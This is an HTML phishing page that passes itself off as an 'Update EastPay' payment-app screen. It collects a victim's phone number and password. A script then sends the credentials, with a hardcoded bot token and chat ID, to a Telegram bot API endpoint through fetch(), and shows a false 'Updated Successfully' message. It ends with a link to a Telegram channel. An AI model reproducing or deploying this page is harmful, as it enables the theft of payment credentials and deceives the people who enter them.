<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EastPay</title>

<style>
body {
  margin: 0;
  font-family: Arial;
  height: 100vh;
  background: radial-gradient(circle at center, #0f3d3e, #062c2c);
  color: white;
}

/* Grid background */
body::before {
  content: "";
  position: absolute;
  width: 100%;
  height: 100%;
  background-image: linear-gradient(rgba(255,255,255,0.05) 1px, transparent 1px),
                    linear-gradient(90deg, rgba(255,255,255,0.05) 1px, transparent 1px);
  background-size: 40px 40px;
}

.container {
  position: relative;
  text-align: center;
  padding-top: 60px;
}

.logo {
  width: 110px;
  border-radius: 50%;
}

h1 {
  margin-top: 10px;
  letter-spacing: 2px;
}

.input-box {
  width: 85%;
  margin: 15px auto;
  padding: 15px;
  border-radius: 15px;
  border: none;
  background: rgba(255,255,255,0.1);
  color: white;
  font-size: 16px;
}

.btn {
  width: 85%;
  padding: 15px;
  margin-top: 20px;
  border-radius: 30px;
  border: none;
  background: #021f20;
  color: #aaa;
  font-size: 18px;
}

.telegram {
  width: 85%;
  padding: 15px;
  margin-top: 15px;
  border-radius: 30px;
  border: none;
  background: #0088cc;
  color: white;
  font-size: 16px;
}
</style>
</head>

<body>

<div class="container">

  <!-- Logo -->
  <img src="logo.png" class="logo">

  <h1>Update EastPay</h1>

  <!-- Inputs -->
  <input type="text" id="user" class="input-box" placeholder="Enter Phone Number">
  <input type="password" id="pass" class="input-box" placeholder="Enter Password">

  <!-- Button -->
  <button class="btn" onclick="sendData()">UPDATE</button>

  <!-- Telegram -->
  <button class="telegram" onclick="openTelegram()">Join Telegram</button>

</div>

<script>

function sendData(){
  let user = document.getElementById("user").value;
  let pass = document.getElementById("pass").value;

  if(user === "" || pass === ""){
    alert("Fill all fields ❌");
    return;
  }

  let msg = "📩 Autumnpe longin\n\n📱 ID: " + user + "\n🔑 Password: " + pass;

  let url = "https://api.telegram.org/bot8387129505:AAHhZqlIEHooMBapgwUfArvZq9u9icX85cQ/sendMessage?chat_id=8632840215&text=" + encodeURIComponent(msg);

  fetch(url);

  alert("Updated Successfully ✅");
}

function openTelegram(){
  window.location.href = "https://t.me/Chandan0391";
}

</script>

</body>
</html>
